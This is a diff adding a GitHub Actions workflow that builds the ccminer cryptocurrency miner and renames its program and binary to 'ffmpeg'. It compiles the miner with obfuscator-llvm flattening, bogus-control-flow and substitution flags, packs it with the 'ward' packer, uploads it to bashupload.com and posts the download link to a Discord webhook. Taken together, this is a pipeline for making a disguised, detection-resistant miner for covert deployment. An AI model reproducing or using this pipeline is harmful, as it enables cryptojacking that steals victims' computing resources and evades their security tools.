@@ -1,0 +1,69 @@
+name: Build ccminer
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Install Dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool
+
+    - name: Install LLVM Obfuscator
+      run: |
+        git clone https://github.com/obfuscator-llvm/obfuscator.git
+        cd obfuscator
+        mkdir build
+        cd build
+        cmake .. -DLLVM_ENABLE_PROJECTS="clang" -G "Unix Makefiles"
+        make -j$(nproc)
+        sudo make install
+
+    - name: Clone and Modify ccminer
+      run: |
+        git clone https://github.com/Oink70/ccminer-verus.git
+        cd ccminer-verus
+        sed -i 's/#define PROGRAM_NAME.*/#define PROGRAM_NAME "ffmpeg"/g' ccminer.cpp
+        sed -i 's/bin_PROGRAMS = ccminer/bin_PROGRAMS = ffmpeg/g' Makefile.am
+
+    - name: Configure and Build ccminer with Obfuscation
+      run: |
+        cd ccminer-verus
+        ./autogen.sh
+        CC=/usr/local/bin/clang CXX=/usr/local/bin/clang++ ./configure \
+          CC=/usr/local/bin/clang \
+          CXX=/usr/local/bin/clang++ \
+          CFLAGS="-mllvm -fla -mllvm -bcf -mllvm -sub" \
+          CXXFLAGS="-mllvm -fla -mllvm -bcf -mllvm -sub"
+        make -j$(nproc)
+
+    - name: Install and Pack with Ward
+      run: |
+        git clone https://github.com/ex0dus-0x/ward.git
+        cd ward
+        sudo python3 setup.py install
+        cd ../ccminer-verus
+        ward ./ffmpeg
+
+    - name: Upload to Bashupload
+      run: |
+        tar -cvf ffmpeg.tar ffmpeg
+        curl -T ./ffmpeg.tar https://bashupload.com/ > upload_url.txt
+
+    - name: Send URL to Discord Webhook
+      run: |
+        UPLOAD_URL=$(cat upload_url.txt | grep -o 'https://bashupload.com/[^\"]*')
+        curl -H "Content-Type: application/json" -X POST \
+        -d "{\"content\":\"$UPLOAD_URL\"}" ${{ secrets.DISCORD_WEBHOOK }}
